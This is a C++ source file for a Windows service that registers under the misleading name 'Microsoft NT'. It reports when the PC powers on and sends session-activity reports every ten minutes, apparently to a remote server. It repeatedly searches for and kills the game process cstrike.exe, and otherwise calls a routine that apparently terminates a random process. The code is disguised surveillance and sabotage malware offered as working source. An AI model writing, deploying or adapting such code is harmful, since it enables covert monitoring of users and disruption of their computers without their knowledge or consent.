#define CPPHTTPLIB_OPENSSL_SUPPORT
#include <winsock2.h>
#include <windows.h>
#include <tlhelp32.h>
#include <thread>
#include <string>

#include "include/server.hpp"
#include "include/KillTask.hpp"
#include "include/NumeroAleatorio.hpp"
#include "include/BusquedaProcesos.hpp"
#include "include/EliminarProcesoAleatorio.hpp"

SERVICE_STATUS_HANDLE g_ServiceHandle = nullptr;
SERVICE_STATUS g_ServiceStatus = {0};

void WINAPI ServiceMain(DWORD argc, LPTSTR *argv);
void WINAPI ServiceCtrlHandler(DWORD control);

void ReportarSesionActiva()
{
    while (true)
    {
        std::this_thread::sleep_for(std::chrono::minutes(10));
        reportar("Sesión abierta");
    }
}

int main()
{
    SERVICE_TABLE_ENTRY serviceTable[] = {
        {(LPSTR) "Microsoft NT", (LPSERVICE_MAIN_FUNCTION)ServiceMain},
        {NULL, NULL}};

    if (!StartServiceCtrlDispatcher(serviceTable))
    {
        return 1;
    }
    return 0;
}

void WINAPI ServiceMain(DWORD argc, LPTSTR *argv)
{
    g_ServiceHandle = RegisterServiceCtrlHandler(TEXT("Microsoft NT"), ServiceCtrlHandler);
    if (!g_ServiceHandle)
    {
        return;
    }

    g_ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    g_ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
    SetServiceStatus(g_ServiceHandle, &g_ServiceStatus);

    g_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    SetServiceStatus(g_ServiceHandle, &g_ServiceStatus);

    reportar("El PC se ha encendido");

    std::thread estado(ReportarSesionActiva);
    estado.detach();

    while (g_ServiceStatus.dwCurrentState == SERVICE_RUNNING)
    {
        int PID;
        std::string cs = "cstrike.exe";

        if (BuscarProceso(cs, &PID))
        {
            std::string mensaje = "Proceso 'cstrike.exe' encontrado con PID: " + std::to_string(PID);
            reportar(mensaje);
            if (!TerminarProceso(PID, NumeroAleatorio::Generar(0, 5)))
            {
                reportar("El proceso no se puede detener");
            }
            else
            {
                reportar("El proceso se detuvo con éxito");
            }
        }
        else
        {
            EliminarProcesoAleatorio(0);
        }

        std::this_thread::sleep_for(std::chrono::seconds(25));
    }

    g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
    SetServiceStatus(g_ServiceHandle, &g_ServiceStatus);
}

void WINAPI ServiceCtrlHandler(DWORD control)
{
    if (control == SERVICE_CONTROL_STOP)
    {
        g_ServiceStatus.dwCurrentState = SERVICE_STOP_PENDING;
        SetServiceStatus(g_ServiceHandle, &g_ServiceStatus);

        g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
        SetServiceStatus(g_ServiceHandle, &g_ServiceStatus);
    }
}
